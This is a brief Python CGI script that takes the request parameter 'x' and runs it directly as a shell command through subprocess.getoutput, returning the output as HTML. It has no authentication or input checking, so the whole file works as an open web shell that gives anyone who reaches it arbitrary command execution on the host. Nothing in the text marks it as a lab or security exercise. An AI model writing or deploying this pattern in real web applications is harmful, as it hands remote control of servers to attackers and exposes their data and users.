#!/usr/bin/python3

import  time,cgi,subprocess,os

print("Content-Type: text/html")
print("")
# to read response from httpd 
webdata=cgi.FieldStorage()
# now extracting only variable from entire response 
data=webdata.getvalue('x')
# running in os 
output=subprocess.getoutput(data)
print("<pre>")
print(output)
print("</pre>")

